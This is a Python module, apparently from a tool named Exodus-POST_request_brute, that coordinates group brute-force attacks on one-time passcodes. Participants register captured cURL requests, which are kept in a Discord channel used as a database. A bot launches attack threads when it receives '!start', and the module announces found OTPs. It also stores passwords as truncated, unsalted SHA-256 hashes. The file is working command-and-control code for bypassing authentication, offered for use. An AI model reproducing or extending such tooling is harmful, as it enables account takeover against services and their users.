# ================================================= #
#  Made by Infinite © 2026
#  GitHub: https://github.com/Infinite-Unknown
#  Updates: https://github.com/Infinite-Unknown/Exodus-POST_request_brute
#
#  Copyright (c) 2026 Infinite. All rights reserved.
#  Free to copy, edit, and distribute.
#  Just give credit: https://github.com/Infinite-Unknown
# ================================================= #

"""
Global Attack Module
Uses Discord as a shared database for collaborative multi-user attacks.
Users register/login, bind their cURL, and all users attack together.
"""

import requests
import json
import os
import hashlib
import time
from datetime import datetime
from ui import font

# Config paths
CONFIG_DIR = os.path.join(os.getcwd(), 'Input')
GLOBAL_CONFIG_PATH = os.path.join(CONFIG_DIR, 'global_config.json')

def ensure_config_dir():
    if not os.path.exists(CONFIG_DIR):
        os.makedirs(CONFIG_DIR)

def hash_password(password):
    """Simple password hashing"""
    return hashlib.sha256(password.encode()).hexdigest()[:16]

def load_global_config():
    """Load local global config (webhook URL and user session)"""
    if os.path.exists(GLOBAL_CONFIG_PATH):
        try:
            with open(GLOBAL_CONFIG_PATH, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            pass
    return None

def save_global_config(config):
    """Save global config locally"""
    ensure_config_dir()
    with open(GLOBAL_CONFIG_PATH, 'w', encoding='utf-8') as f:
        json.dump(config, f, indent=2)

def send_webhook(webhook_url, content=None, embed=None, files=None):
    """Send message to Discord webhook"""
    payload = {}
    if content:
        payload['content'] = content
    if embed:
        payload['embeds'] = [embed]
    
    try:
        if files:
            # When sending files, payload must be sent as 'payload_json'
            multipart_data = {
                'payload_json': (None, json.dumps(payload), 'application/json')
            }
            multipart_data.update(files)
            response = requests.post(webhook_url, files=multipart_data)
        else:
            response = requests.post(webhook_url, json=payload)
            
        if response.status_code in [200, 204]:
            return True, response
        else:
            return False, f"HTTP {response.status_code}: {response.text}"
    except Exception as e:
        return False, str(e)

def register_user(data_webhook_url, username, password, curl_data, opt_in=True, notify_webhook_url=None, suppress_notification=False, class_name=None):
    """
    Register a new user to the global database.
    
    Args:
        ...
        suppress_notification: If True, skip sending the "New User" notification
        class_name: Optional class group for the user
    """
    password_hash = hash_password(password)
    
    # Create user data packet
    user_data = {
        "username": username,
        "password_hash": password_hash,
        "curl_data": curl_data,
        "opt_in": opt_in,
        "class_name": class_name,
        "registered": datetime.now().isoformat()
    }
    
    encoded_data = json.dumps(user_data, indent=2)
    
    files = {
        'file': ('user_data.json', encoded_data, 'application/json')
    }
    
    data_message = f"[EXODUS_GLOBAL_USER:{username}]"
    success, error = send_webhook(data_webhook_url, content=data_message, files=files)
    
    if not success:
        return False, error
    
    # Send notification to public channel if provided and not suppressed
    if notify_webhook_url and not suppress_notification:
        embed = {
            "title": "👤 New User Joined",
            "description": f"**{username}** has joined the network!",
            "color": 5763719, # Green
            "fields": [
                {"name": "Status", "value": "Active" if opt_in else "Opted Out", "inline": True},
                {"name": "Class", "value": class_name if class_name else "None", "inline": True},
                {"name": "Joined", "value": f"<t:{int(time.time())}:R>", "inline": True}
            ],
            "timestamp": datetime.now().isoformat(),
            "footer": {"text": "Exodus Global Network"}
        }
        send_webhook(notify_webhook_url, None, embed)
    
    trigger_dashboard_update()
    return True, None

def update_user_curl(data_webhook_url, username, password, new_curl, opt_in=True, notify_webhook_url=None, update_reason="Configuration Update", class_name=None):
    """Update an existing user's cURL data, opt-in status, and class"""
    password_hash = hash_password(password)
    
    user_data = {
        "username": username,
        "password_hash": password_hash,
        "curl_data": new_curl,
        "opt_in": opt_in,
        "class_name": class_name,
        "updated": datetime.now().isoformat()
    }
    
    encoded_data = json.dumps(user_data, indent=2)
    
    files = {
        'file': ('user_data.json', encoded_data, 'application/json')
    }
    
    data_message = f"[EXODUS_GLOBAL_USER:{username}]"
    success, error = send_webhook(data_webhook_url, content=data_message, files=files)
    
    if not success:
        return False, error
    
    # Notification
    if notify_webhook_url:
        status_str = "Active" if opt_in else "Opted Out"
        embed = {
            "title": "🔄 Account Updated",
            "description": f"**{username}** updated their settings.",
            "color": 3447003, # Blue
            "fields": [
                {"name": "Update Type", "value": update_reason, "inline": True},
                {"name": "Status", "value": status_str, "inline": True},
                {"name": "Class", "value": class_name if class_name else "None", "inline": True},
                {"name": "Updated", "value": f"<t:{int(time.time())}:R>", "inline": True}
            ],
            "timestamp": datetime.now().isoformat(),
            "footer": {"text": "Exodus Global Network"}
        }
        send_webhook(notify_webhook_url, None, embed)
    
    trigger_dashboard_update()
    return True, None

def update_user_status(data_webhook_url, username, password, curl_data, opt_in, notify_webhook_url=None, class_name=None):
    """Update just the opt-in status (preserves class if passed, otherwise tries to keep it?)"""
    # Note: caller should pass current class_name if they want to preserve it!
    reason = "Opt-In" if opt_in else "Opt-Out"
    return update_user_curl(data_webhook_url, username, password, curl_data, opt_in, notify_webhook_url, update_reason=f"Status Change ({reason})", class_name=class_name)

def update_user_class(data_webhook_url, username, password, curl_data, opt_in, class_name, notify_webhook_url=None):
    """Update just the class"""
    reason = f"Joined {class_name}" if class_name else "Left Class"
    return update_user_curl(data_webhook_url, username, password, curl_data, opt_in, notify_webhook_url, update_reason="Class Change", class_name=class_name)

def delete_discord_message(channel_id, message_id, bot_token):
    """Delete a specific message from Discord"""
    url = f"https://discord.com/api/v10/channels/{channel_id}/messages/{message_id}"
    headers = {
        "Authorization": f"Bot {bot_token}"
    }
    try:
        response = requests.delete(url, headers=headers)
        return response.status_code == 204
    except:
        return False

def update_user_password(data_webhook_url, username, new_password, curl_data, opt_in=True, notify_webhook_url=None, class_name=None):
    """Update user password (creates new entry)"""
    # Suppress default registration notify, send custom one
    success, err = register_user(data_webhook_url, username, new_password, curl_data, opt_in, notify_webhook_url, suppress_notification=True, class_name=class_name)
    
    if success and notify_webhook_url:
        embed = {
            "title": "🔐 Security Update",
            "description": f"**{username}** changed their password.",
            "color": 15105570, # Orange
            "timestamp": datetime.now().isoformat()
        }
        send_webhook(notify_webhook_url, None, embed)
        
    return success, err

def rename_user(data_webhook_url, channel_id, bot_token, old_username, new_username, password, curl_data, old_message_id, opt_in=True, class_name=None):
    """
    Rename user:
    1. Register new username
    2. Delete old message
    """
    
    success, error = register_user(data_webhook_url, new_username, password, curl_data, opt_in, suppress_notification=True, class_name=class_name)
    if not success:
        return False, f"Failed to register new name: {error}"
    
    # 2. Delete old message
    if old_message_id:
        delete_discord_message(channel_id, old_message_id, bot_token)
        
    # Manual Notification for Rename
    try:
        cfg = load_global_config()
        notify_url = cfg.get('notify_webhook')
        if notify_url:
            embed = {
                "title": "📝 User Renamed",
                "description": f"**{old_username}** is now **{new_username}**",
                "color": 3447003,
                "timestamp": datetime.now().isoformat()
            }
            send_webhook(notify_url, None, embed)
    except:
        pass
            
    return True, None

# === CLASSES MANAGEMENT ===

def fetch_classes(channel_id, bot_token):
    """
    Fetch list of available classes from Discord.
    Looks for message with [EXODUS_CLASSES] tag.
    Returns: (classes_list, message_id)
    """
    messages, err = fetch_channel_messages(channel_id, bot_token)
    if err or not messages:
        return [], None
        
    for msg in messages:
        content = msg.get('content', '')
        if '[EXODUS_CLASSES]' in content:
            try:
                start = content.find('[EXODUS_CLASSES]') + len('[EXODUS_CLASSES]')
                end = content.find('[/EXODUS_CLASSES]')
                json_str = content[start:end].strip()
                json_str = json_str.replace('```', '').strip() # Clean code blocks if any
                
                classes = json.loads(json_str)
                return classes, msg['id']
            except:
                continue
                
    return [], None

def save_classes(channel_id, bot_token, classes_list, old_message_id=None):
    """
    Save list of classes to Discord.
    Deletes old message if exists.
    """
    url = f"https://discord.com/api/v10/channels/{channel_id}/messages"
    headers = {
        "Authorization": f"Bot {bot_token}",
        "Content-Type": "application/json"
    }
    
    # Delete old first
    if old_message_id:
        delete_discord_message(channel_id, old_message_id, bot_token)
        
    content = f"[EXODUS_CLASSES] {json.dumps(classes_list)} [/EXODUS_CLASSES]"
    
    embed = {
        "title": "📚 Global Classes",
        "description": "List of available attack groups.",
        "color": 10181046, # Purple
        "fields": [
            {"name": "Classes", "value": "\n".join([f"• {c}" for c in classes_list]) if classes_list else "(None)", "inline": False}
        ],
        "footer": {"text": "Exodus Global System"}
    }
    
    payload = {
        "content": content,
        "embeds": [embed]
    }
    
    try:
        response = requests.post(url, headers=headers, json=payload)
        return response.status_code in [200, 201]
    except:
        return False

def fetch_channel_messages(channel_id, bot_token):
    """
    Fetch messages from Discord channel using bot token.
    This requires a bot token with read message permissions.
    """
    url = f"https://discord.com/api/v10/channels/{channel_id}/messages?limit=100"
    headers = {
        "Authorization": f"Bot {bot_token}"
    }
    
    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            return response.json(), None
        else:
            return None, f"HTTP {response.status_code}: {response.text}"
    except Exception as e:
        return None, str(e)

def parse_users_from_messages(messages):
    """Parse user data from Discord messages (supports file attachments)"""
    users = {}
    
    for msg in messages:
        # Check attachments first (new method)
        if msg.get('attachments'):
            for attachment in msg['attachments']:
                # Look for user_data.json or similar
                if attachment['filename'] == 'user_data.json' or attachment['filename'].endswith('.json'):
                    try:
                        # Download the file content
                        # Note: This increases network usage but is necessary for large files
                        resp = requests.get(attachment['url'])
                        if resp.status_code == 200:
                            user_data = resp.json()
                            username = user_data.get('username')
                            
                            if username and username not in users:
                                users[username] = user_data
                                users[username]['message_id'] = msg['id']
                    except:
                        continue
        
        # Fallback to old method (text content) for backward compatibility
        content = msg.get('content', '')
        if '[EXODUS_GLOBAL_USER]' in content and '[/EXODUS_GLOBAL_USER]' in content:
            try:
                start = content.find('[EXODUS_GLOBAL_USER]') + len('[EXODUS_GLOBAL_USER]')
                end = content.find('[/EXODUS_GLOBAL_USER]')
                json_str = content[start:end].strip()
                json_str = json_str.replace('```', '').strip()
                
                user_data = json.loads(json_str)
                username = user_data.get('username')
                
                if username and username not in users:
                    users[username] = user_data
                    users[username]['message_id'] = msg['id']
                        
            except json.JSONDecodeError:
                continue
    
    return users

def authenticate_user(users_dict, username, password):
    """Check if username/password matches stored data"""
    password_hash = hash_password(password)
    
    if username in users_dict:
        stored_hash = users_dict[username].get('password_hash')
        if stored_hash == password_hash:
            return True, users_dict[username]
    
    return False, None

def get_all_user_curls(users_dict):
    """Extract all cURL configs from users for attack"""
    curls = []
    
    for username, data in users_dict.items():
        # Check participation status (default to True if not present)
        if not data.get('opt_in', True):
            continue
            
        curl_data = data.get('curl_data')
        if curl_data:
            curls.append({
                'username': username,
                'curl': curl_data
            })
    
    return curls

def send_attack_notification(webhook_url, initiator, user_count):
    """Notify Discord that an attack is starting"""
    embed = {
        "title": "⚔️ GLOBAL ATTACK INITIATED",
        "description": f"**{initiator}** started a global attack!",
        "color": 15158332,  # Red
        "fields": [
            {
                "name": "Users Participating",
                "value": str(user_count),
                "inline": True
            },
            {
                "name": "Time",
                "value": datetime.now().strftime("%H:%M:%S"),
                "inline": True
            }
        ],
        "footer": {"text": "Exodus Global Network"}
    }
    
    return send_webhook(webhook_url, "@everyone Global Attack Started!", embed)

def send_otp_found_notification(webhook_url, otp, found_by):
    """Notify Discord that OTP was found"""
    embed = {
        "title": "🎉 OTP FOUND - GLOBAL SUCCESS!",
        "description": "The OTP has been discovered!",
        "color": 5763719,  # Green
        "fields": [
            {
                "name": "OTP",
                "value": f"**`{otp}`**",
                "inline": True
            },
            {
                "name": "Found By",
                "value": found_by,
                "inline": True
            }
        ],
        "footer": {"text": "Exodus Global Network"}
    }
    
    return send_webhook(webhook_url, "@everyone OTP Found!", embed)

def test_bot_connection(channel_id, bot_token):
    """Test if bot can access the channel"""
    messages, error = fetch_channel_messages(channel_id, bot_token)
    if error:
        return False, error
    return True, f"Found {len(messages)} messages"

# === STATUS DASHBOARD FUNCTIONS ===

def init_status_dashboard(channel_id, bot_token):
    """
    Initialize the status dashboard message.
    Returns: (message_id, error)
    """
    url = f"https://discord.com/api/v10/channels/{channel_id}/messages"
    headers = {
        "Authorization": f"Bot {bot_token}",
        "Content-Type": "application/json"
    }
    
    embed = {
        "title": "📊 Exodus Global Status",
        "description": "Initializing dashboard...",
        "color": 3447003,
        "timestamp": datetime.now().isoformat(),
        "footer": {"text": "Live Status Board"}
    }
    
    payload = {
        "embeds": [embed]
    }
    
    try:
        response = requests.post(url, headers=headers, json=payload)
        if response.status_code == 200:
            return response.json()['id'], None
        else:
            return None, f"HTTP {response.status_code}: {response.text}"
    except Exception as e:
        return None, str(e)

def update_dashboard_display(channel_id, message_id, bot_token, users_dict):
    """Update the existing dashboard message with current user stats"""
    url = f"https://discord.com/api/v10/channels/{channel_id}/messages/{message_id}"
    headers = {
        "Authorization": f"Bot {bot_token}",
        "Content-Type": "application/json"
    }
    
    # Calculate stats
    total_users = len(users_dict)
    active_users = 0
    opted_out = 0
    
    # Text list of active users
    active_list = []
    
    sorted_users = sorted(users_dict.items())
    
    for username, data in sorted_users:
        class_str = f" [{data.get('class_name')}]" if data.get('class_name') else ""
        if data.get('opt_in', True):
            active_users += 1
            # Add timestamp of last update if available?
            updated = data.get('updated') or data.get('registered')
            time_str = f"<t:{int(datetime.fromisoformat(updated).timestamp())}:R>" if updated else ""
            active_list.append(f"🟢 **{username}**{class_str} {time_str}")
        else:
            opted_out += 1
            updated = data.get('updated') or data.get('registered')
            time_str = f"<t:{int(datetime.fromisoformat(updated).timestamp())}:R>" if updated else ""
            active_list.append(f"🔴 **{username}**{class_str} (Opted Out) {time_str}")
            
    status_text = "\n".join(active_list) if active_list else "*No users found*"
    if len(status_text) > 3500: # Truncate if too long
        status_text = status_text[:3500] + "\n... (truncated)"
        
    embed = {
        "title": "📊 Exodus Global Status",
        "color": 3447003, # Blue
        "fields": [
            {"name": "Summary", "value": f"**Total:** {total_users} | **Active:** {active_users} | **Opted Out:** {opted_out}", "inline": False},
            {"name": "Operatives", "value": status_text, "inline": False}
        ],
        "timestamp": datetime.now().isoformat(),
        "footer": {"text": f"Last Updated • {datetime.now().strftime('%H:%M:%S')}"}
    }
    
    payload = {
        "embeds": [embed]
    }
    
    try:
        requests.patch(url, headers=headers, json=payload)
    except:
        pass

def trigger_dashboard_update():
    """Helper to trigger dashboard update using saved config"""
    try:
        config = load_global_config()
        if not config: return
        
        status_ch = config.get('status_channel_id')
        status_msg = config.get('status_message_id')
        bot_token = config.get('bot_token')
        data_ch = config.get('channel_id')
        
        if status_ch and status_msg and bot_token and data_ch:
            # We need to fetch users to update display
             messages, err = fetch_channel_messages(data_ch, bot_token)
             if not err:
                 users = parse_users_from_messages(messages)
                 update_dashboard_display(status_ch, status_msg, bot_token, users)
    except Exception:
        pass # Fail silently in background

# === DISCORD COMMAND CONTROL ===

def check_user_role(guild_id, user_id, role_id, bot_token):
    """
    Check if a user has a specific role in a guild.
    """
    url = f"https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}"
    headers = {
        "Authorization": f"Bot {bot_token}"
    }
    
    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            member = response.json()
            roles = member.get('roles', [])
            return role_id in roles
        return False
    except:
        return False

def listen_for_commands(bot_token, channel_id, guild_id, role_id):
    """
    Polls Discord channel for !start and !stop commands.
    Restricted to users with role_id.
    """
    import threading
    import attacker 
    
    print(font("\n [BOT] Listening for commands (!start, !stop)...", color="magenta", inverse=True))
    print(font(" Press 'q' or 'esc' to stop the bot.", color="yellow"))
    
    import keyboard
    
    last_message_id = None
    attack_thread = None
    stop_event = None
    
    # Get initial latest message to avoid processing old commands
    msgs, err = fetch_channel_messages(channel_id, bot_token)
    if not err and msgs:
        last_message_id = msgs[0]['id'] # Newest message
        
    while True:
        if keyboard.is_pressed('q') or keyboard.is_pressed('esc'):
            if stop_event:
                stop_event.set()
            break
            
        time.sleep(2) # Poll every 2 seconds
        
        messages, err = fetch_channel_messages(channel_id, bot_token)
        if err or not messages:
            continue
            
        # Process new messages (messages are usually sorted newest first)
        # We search from newest until we hit last_message_id
        new_commands = []
        for msg in messages:
            if msg['id'] == last_message_id:
                break
            new_commands.append(msg)
            
        if not new_commands:
            continue
            
        # Update last seen
        last_message_id = messages[0]['id']
        
        # Process commands (oldest to newest)
        for msg in reversed(new_commands):
            content = msg.get('content', '').strip()
            author = msg.get('author', {})
            user_id = author.get('id')
            username = author.get('username')
            
            if not content.startswith('!'):
                continue
                
            cmd = content.lower()
            
            if cmd == '!start':
                # Check permissions
                if not check_user_role(guild_id, user_id, role_id, bot_token):
                     send_webhook(f"https://discord.com/api/v10/channels/{channel_id}/messages", 
                                  None, 
                                  {"title": "⛔ Access Denied", "description": "You do not have permission.", "color": 15548997}) # Red
                     continue
                     
                if attack_thread and attack_thread.is_alive():
                    # Already running
                    continue
                    
                # START ATTACK
                print(font(f"\n [BOT] Command received from {username}: !start", color="green"))
                
                # Fetch users
                all_msgs, _ = fetch_channel_messages(channel_id, bot_token)
                users_map = parse_users_from_messages(all_msgs)
                
                # Prepare users
                active_users = []
                for u, data in users_map.items():
                    if data.get('opt_in', True) and data.get('curl_data'):
                        active_users.append({'username': u, 'curl': data['curl_data']})
                
                if not active_users:
                     send_webhook(f"https://discord.com/api/v10/channels/{channel_id}/messages", "No active users found!", None)
                     continue
                     
                # Prepare Temp Files
                temp_dir = os.path.join(os.getcwd(), 'Input', 'GlobalTemp')
                if not os.path.exists(temp_dir):
                    os.makedirs(temp_dir)
                for f in os.listdir(temp_dir):
                    os.remove(os.path.join(temp_dir, f))
                
                temp_files = []
                for u in active_users:
                    fname = f"{u['username']}.txt"
                    with open(os.path.join(temp_dir, fname), 'w', encoding='utf-8') as f:
                        f.write(u['curl'])
                    temp_files.append(fname)
                    
                # Launch Thread
                stop_event = threading.Event()
                # Assuming standard config for threads/cooldown
                notify_url = None # Could pull from config if passed in, but we have bot token
                
                # We need to send a webhook to the channel to notify
                # Actually run_global_attack takes a webhook url for notifications
                # We can construct one or just reuse the logic
                
                attack_thread = threading.Thread(
                    target=attacker.run_global_attack,
                    args=(temp_files, temp_dir, 4, 0.5, None, stop_event) 
                )
                attack_thread.daemon = True
                attack_thread.start()
                
                send_webhook(f"https://discord.com/api/v10/channels/{channel_id}/messages", 
                             f"🚀 **Attack Initiated** by {username} ({len(active_users)} operatives)", 
                             None)

            elif cmd == '!stop':
                # Check permissions
                if not check_user_role(guild_id, user_id, role_id, bot_token):
                     continue # Ignore or redundant deny
                     
                if attack_thread and attack_thread.is_alive():
                    print(font(f"\n [BOT] Command received from {username}: !stop", color="yellow"))
                    if stop_event:
                        stop_event.set()
                    
                    send_webhook(f"https://discord.com/api/v10/channels/{channel_id}/messages", 
                                 f"🛑 **Attack Stopped** by {username}", 
                                 None)
                else:
                    # Not running
                    pass

